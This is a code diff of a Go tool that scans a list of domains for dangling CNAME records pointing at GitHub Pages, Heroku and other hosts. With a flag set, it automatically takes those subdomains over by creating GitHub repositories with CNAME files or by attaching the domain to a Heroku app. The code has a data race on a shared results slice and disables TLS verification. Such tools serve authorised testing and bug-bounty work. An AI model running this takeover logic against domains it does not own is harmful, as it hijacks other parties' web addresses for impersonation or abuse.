@@ -2,8 +2,9 @@ package main
 
 import (
 	"bufio"
+	"bytes"
+	"context"
 	"crypto/tls"
-	"encoding/csv"
 	"flag"
 	"fmt"
 	"io/ioutil"
@@ -11,157 +12,81 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"os/exec"
 	"regexp"
+	"sync"
 	"time"
 
-	"github.com/anshumanbh/go-github/github"
-	"github.com/bgentry/heroku-go"
-	"github.com/subosito/gotenv"
 	"golang.org/x/oauth2"
+
+	heroku "github.com/bgentry/heroku-go"
+	"github.com/gocarina/gocsv"
+	"github.com/google/go-github/github"
+	"github.com/subosito/gotenv"
 )
 
-func main() {
+var tkoRes []tkosubsResult //global variable to store all the results
 
-	gotenv.Load()
+//Defining the flag variables
+var (
+	domainsFilePath = flag.String("domains", "domains.txt", "List of domains to check")
+	recordsFilePath = flag.String("data", "providers-data.csv", "CSV file containing CMS providers' string for identification")
+	outputFilePath  = flag.String("output", "output.csv", "Output file to save the results")
+	takeOver        = flag.Bool("takeover", false, "Flag to denote if a vulnerable domain needs to be taken over or not")
+)
 
-	domainsFilePath := flag.String("domains", "domains.txt", "List of domains to check")
-	recordsFilePath := flag.String("data", "providers-data.csv", "CSV file containing providers' data")
-	outputFilePath := flag.String("output", "output.csv", "File to save results in")
-
-	flag.Parse()
-
-	domainsFile, err := os.Open(*domainsFilePath)
-	if err != nil {
-		log.Fatalln(err)
+//Checkiferr function as a generic check for error function
+func Checkiferr(e error) {
+	if e != nil {
+		panic(e)
 	}
-	defer domainsFile.Close()
-	domainsScanner := bufio.NewScanner(domainsFile)
-
-	recordsFile, err := os.Open(*recordsFilePath)
-	if err != nil {
-		log.Fatalln(err)
-	}
-	defer recordsFile.Close()
-	recordsReader := bufio.NewReader(recordsFile)
-	csvReader := csv.NewReader(recordsReader)
-	records, err := csvReader.ReadAll()
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	var output [][]string
-
-	for domainsScanner.Scan() {
-		domain := domainsScanner.Text()
-
-		output = append(output, IsReachable(domain, records))
-	}
-
-	outputFile, _ := os.Create(*outputFilePath)
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer outputFile.Close()
-
-	outputWriter := csv.NewWriter(outputFile)
-	outputWriter.WriteAll(output)
 }
 
-func IsReachable(domain string, records [][]string) []string {
-	ch := make(chan []string, 1)
-	go func() {
-		select {
-		case ch <- check(domain, records):
-		case <-time.After(5 * time.Second):
-			fmt.Println("timedout")
-		}
-	}()
-	return <-ch
+//Info function to print pretty output
+func Info(format string, args ...interface{}) {
+	fmt.Printf("\x1b[34;1m%s\x1b[0m\n", fmt.Sprintf(format, args...))
 }
 
-func check(domain string, records [][]string) []string {
-	// domain, provider, vulnerable, takenover
-	output := []string{domain, "", "false", "false"}
-
-	cname, _ := net.LookupCNAME(domain)
-	for i := range records{
-
-		record := records[i]
-
-		provider_name := record[0]  // The name of the provider
-		provider_cname := record[1] // The CNAME used by the provider
-		provider_error := record[2] // The error message that's returned for an unclaimed domain
-		provider_http := record[3]  // Access through http not https (true or false)
-		usesprovider, _ := regexp.MatchString(provider_cname, cname)
-		if usesprovider {
-			output[1] = provider_name
-			tr := &http.Transport{
-				Dial: (&net.Dialer{
-					Timeout: 5 * time.Second,
-				}).Dial,
-				TLSHandshakeTimeout: 5 * time.Second,
-				TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
-			}
-
-			timeout := time.Duration(5 * time.Second)
-			client := &http.Client{
-				Transport: tr,
-				Timeout:   timeout,
-			}
-
-			protocol := "https://"
-			if provider_http == "true" {
-				protocol = "http://"
-			}
-
-			response, err := client.Get(protocol + domain)
-			if err != nil {
-				fmt.Println("")
-				fmt.Println("Can't reach the domain " + domain)
-				return output
-			}
-
-			text, err := ioutil.ReadAll(response.Body)
-			if err != nil {
-				log.Fatal(err)
-				fmt.Println("Trouble reading response")
-				return output
-			}
-
-			cantakeover, _ := regexp.MatchString(provider_error, string(text))
-			if cantakeover {
-				output[2] = "true"
-				if takeover(domain, provider_name) {
-					output[3] = "true"
-				}
-			}
-			return output
-		}
-	}
-	fmt.Println(domain + " Not found as dangling for any of the common content hosting websites")
-	return output
+//CMS struct to define the CMS data provider file
+type CMS struct {
+	Name     string `csv:"name"`
+	CName    string `csv:"cname"`
+	String   string `csv:"string"`
+	OverHTTP string `csv:"http"`
 }
 
-func takeover(domain string, provider string) bool {
+//tkosubsResult struct to define the results
+type tkosubsResult struct {
+	Domain       string
+	Provider     string
+	IsVulnerable bool
+	IsTakenOver  bool
+	RespString   string
+}
+
+//takeoversub function to decide what to do depending upon the CMS
+func takeoversub(domain string, provider string) (bool, error) {
 	switch provider {
 	case "github":
-		return githubcreate(domain)
+		resGithub, err := githubcreate(domain)
+		Checkiferr(err)
+		return resGithub, nil
 	case "heroku":
-		return herokucreate(domain)
+		resHeroku, err := herokucreate(domain)
+		Checkiferr(err)
+		return resHeroku, nil
 	}
-	fmt.Printf("Found: Misconfigured %s website at %s\n", provider, domain)
-	fmt.Println("This can potentially be taken over. Unfortunately, the tool does not support taking over " + provider + " websites at the moment.")
-	return false
+	return false, nil //for any other CMS that are not defined above, can't take over so return false with no error
 }
 
-func githubcreate(domain string) bool {
+//githubcreate function to take over dangling Github Pages
+func githubcreate(domain string) (bool, error) {
 
-	fmt.Println("Found: Misconfigured Github Page at " + domain)
-	fmt.Println("Trying to take over this domain now..Please wait for a few seconds")
+	ctx := context.Background()
 
 	// Connecting to your Github account using the Personal Access Token
-	ts := oauth2.StaticTokenSource(&oauth2.Token{AccessToken: os.Getenv("token")})
-	tc := oauth2.NewClient(oauth2.NoContext, ts)
+	ts := oauth2.StaticTokenSource(&oauth2.Token{AccessToken: os.Getenv("githubtoken")})
+	tc := oauth2.NewClient(ctx, ts)
 	client := github.NewClient(tc)
 
 	repo := &github.Repository{
@@ -172,10 +97,10 @@ func githubcreate(domain string) bool {
 	}
 
 	// Creating a repo
-	repocreate, _, err := client.Repositories.Create("", repo)
+	repocreate, _, err := client.Repositories.Create(ctx, "", repo)
 	if _, ok := err.(*github.RateLimitError); ok {
 		log.Println("hit rate limit")
-		return false
+		return false, err
 	}
 
 	reponame := *repocreate.Name
@@ -184,10 +109,10 @@ func githubcreate(domain string) bool {
 	ref := "refs/heads/master"
 
 	// Retrieving the SHA value of the head branch
-	SHAvalue, _, err := client.Repositories.GetCommitSHA1(ownername, reponame, ref, "")
+	SHAvalue, _, err := client.Repositories.GetCommitSHA1(ctx, ownername, reponame, ref, "")
 	if _, ok := err.(*github.RateLimitError); ok {
 		log.Println("hit rate limit")
-		return false
+		return false, err
 	}
 
 	opt := &github.Reference{
@@ -199,10 +124,10 @@ func githubcreate(domain string) bool {
 	}
 
 	// Creating the gh-pages branch using the SHA value obtained above
-	newref, _, err := client.Git.CreateRef(ownername, reponame, opt)
+	_, _, err = client.Git.CreateRef(ctx, ownername, reponame, opt)
 	if _, ok := err.(*github.RateLimitError); ok {
 		log.Println("hit rate limit")
-		return false
+		return false, err
 	}
 
 	Indexpath := "index.html"
@@ -216,10 +141,10 @@ func githubcreate(domain string) bool {
 	}
 
 	// Creating the index file with the text you want to see when the domain is taken over
-	newfile1, _, err := client.Repositories.CreateFile(ownername, reponame, Indexpath, indexfile)
+	_, _, err = client.Repositories.CreateFile(ctx, ownername, reponame, Indexpath, indexfile)
 	if _, ok := err.(*github.RateLimitError); ok {
 		log.Println("hit rate limit")
-		return false
+		return false, err
 	}
 
 	cnamefile := &github.RepositoryContentFileOptions{
@@ -229,23 +154,18 @@ func githubcreate(domain string) bool {
 	}
 
 	// Creating the CNAME file with the domain that needs to be taken over
-	newfile2, _, err := client.Repositories.CreateFile(ownername, reponame, CNAMEpath, cnamefile)
+	_, _, err = client.Repositories.CreateFile(ctx, ownername, reponame, CNAMEpath, cnamefile)
 	if _, ok := err.(*github.RateLimitError); ok {
 		log.Println("hit rate limit")
-		return false
+		return false, err
 	}
 
-	fmt.Println("Branch created at " + *newref.URL)
-	fmt.Println("Index File created at " + *newfile1.URL)
-	fmt.Println("CNAME file created at " + *newfile2.URL)
-
-	fmt.Println("Please check " + domain + " after a few minutes to ensure that it has been taken over..")
-	return true
+	Info("Please check " + domain + " after a few minutes to ensure that it has been taken over..")
+	return true, nil
 }
 
-func herokucreate(domain string) bool {
-	fmt.Println("Found: Misconfigured Heroku app at " + domain)
-	fmt.Println("Trying to take over this domain now..Please wait for a few seconds")
+//herokucreate function to take over dangling Heroku apps
+func herokucreate(domain string) (bool, error) {
 
 	// Connecting to your Heroku account using the usernamd and the API key provided in the .env file
 	client := heroku.Client{Username: os.Getenv("herokuusername"), Password: os.Getenv("herokuapikey")}
@@ -254,6 +174,162 @@ func herokucreate(domain string) bool {
 	// This results in the dangling domain pointing to your Heroku appname
 	client.DomainCreate(os.Getenv("herokuappname"), domain)
 
-	fmt.Println("Please check " + domain + " after a few minutes to ensure that it has been taken over..")
-	return true
+	Info("Please check " + domain + " after a few minutes to ensure that it has been taken over..")
+	return true, nil
+}
+
+//scanforeachDomain function to scan for each domain being read from the domains file
+func scanforeachDomain(domain string, cmsRecords []*CMS, wg *sync.WaitGroup) {
+
+	//Doing CNAME lookups using GOLANG's net package or for that matter just doing a host on a domain
+	//does not necessarily let us know about any dead DNS records. So, we need to use dig CNAME <domain> +short
+	//to properly figure out if there are any dead DNS records
+
+	cmd := exec.Command("dig", "CNAME", domain, "+short")
+	var out bytes.Buffer
+	cmd.Stdout = &out
+	err := cmd.Run()
+	Checkiferr(err)
+
+	//Grabbing the output from the DIG command and storing it in the cname variable
+	cname := out.String()
+
+	var tkr tkosubsResult
+	var isVulnerable bool
+
+	//Defining the transport client that we will need to curl domains
+	tr := &http.Transport{
+		Dial: (&net.Dialer{
+			Timeout: 5 * time.Second,
+		}).Dial,
+		TLSHandshakeTimeout: 5 * time.Second,
+		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
+	}
+
+	timeout := time.Duration(5 * time.Second)
+	client := &http.Client{
+		Transport: tr,
+		Timeout:   timeout,
+	}
+
+	//Now, for each entry in the data providers file, we will check to see if the output
+	//from the dig command against the current domain matches the CNAME for that data provider
+	//if it matches the CNAME, we need to now check if it matches the string for that data provider
+	//So, we curl it and see if it matches. At this point, we know its vulnerable
+	//Next, if we have the -takeover flag set to 1, we will also try to take over the dangling subdomain
+
+	for _, cmsRecord := range cmsRecords {
+
+		//by default, we try to curl using https but there are some CMS that take http only
+		//we specify this in the data providers file
+		protocol := "https://"
+		if cmsRecord.OverHTTP == "true" {
+			protocol = "http://"
+		}
+
+		usesprovider, err := regexp.MatchString(cmsRecord.CName, cname) //matching for the CNAME
+		Checkiferr(err)
+
+		if usesprovider { //if it matches the CNAME, create an entry in the final output
+			tkr.Domain = domain
+			tkr.IsTakenOver = false
+			tkr.IsVulnerable = false
+			tkr.Provider = cmsRecord.Name
+			tkr.RespString = cmsRecord.String
+
+			//Heroku behaves slightly different. Even if there is a dead DNS record for Heroku
+			//it would not resolve using host and you can't curl the website unlike other CMS
+			//but you will find it using dig
+			//So, if there is a CNAME match for heroku and can't curl it, we will assume its vulnerable
+			//if its not heroku, we will try to curl and regex match the string obtained in the response with
+			//the string specified in the data providers file to see if its vulnerable or not
+
+			response, err := client.Get(protocol + domain)
+			if err != nil && cmsRecord.Name == "heroku" {
+				isVulnerable = true
+				tkr.RespString = "Can't CURL it but dig shows a dead DNS record"
+			} else if err != nil && cmsRecord.Name != "heroku" {
+				fmt.Println(err)
+				panic(err)
+			} else if err == nil {
+				text, err := ioutil.ReadAll(response.Body)
+				Checkiferr(err)
+
+				isVulnerable, err = regexp.MatchString(cmsRecord.String, string(text))
+				Checkiferr(err)
+			}
+
+			//We now know if its vulnerable or not.
+			if isVulnerable {
+				tkr.IsVulnerable = true
+
+				switch *takeOver { //we know its vulnerable now. depending upon the flag to take over or not, we go forward
+				case true:
+					takenOver, err := takeoversub(domain, cmsRecord.Name)
+					Checkiferr(err)
+					if takenOver { //if successfully taken over
+						tkr.IsTakenOver = true
+					}
+				}
+
+			}
+
+			tkoRes = append(tkoRes, tkr)
+		}
+	}
+	wg.Done()
+}
+
+func main() {
+
+	//Loading the environment variables from the .env file
+	gotenv.Load()
+
+	//Parsing the flags
+	flag.Parse()
+
+	//Opening the data providers file to read it
+	clientsFile, err := os.OpenFile(*recordsFilePath, os.O_RDWR|os.O_CREATE, os.ModePerm)
+	Checkiferr(err)
+	defer clientsFile.Close()
+
+	//Instantiating the CMS type to read all the values from the data providers file into this struct
+	cmsRecords := []*CMS{}
+
+	//Converting the data from the data providers CSV file to the CMS struct
+	err = gocsv.UnmarshalFile(clientsFile, &cmsRecords)
+	Checkiferr(err)
+
+	//Opening the domains file to test each domain
+	domainsFile, err := os.Open(*domainsFilePath)
+	Checkiferr(err)
+	defer domainsFile.Close()
+
+	//Instantiating the bufio scanner to read the domains file
+	domainsScanner := bufio.NewScanner(domainsFile)
+
+	//For each domain being read, scan it to see if it has a dangling CNAME that can be taken over
+	var wg sync.WaitGroup
+	for domainsScanner.Scan() {
+		wg.Add(1)
+		domain := domainsScanner.Text()
+		go scanforeachDomain(domain, cmsRecords, &wg) //function to scan for each domain being run in a goroutine
+	}
+	wg.Wait()
+
+	//We have all the results now. Printing it out on the screen
+	for _, element := range tkoRes {
+		fmt.Println(element)
+	}
+
+	//Also, saving it back to a csv file
+	outputFile, err := os.Create(*outputFilePath)
+	Checkiferr(err)
+	defer outputFile.Close()
+
+	err = gocsv.MarshalFile(&tkoRes, outputFile)
+	Checkiferr(err)
+
+	Info("Results saved to: " + *outputFilePath)
+
 }
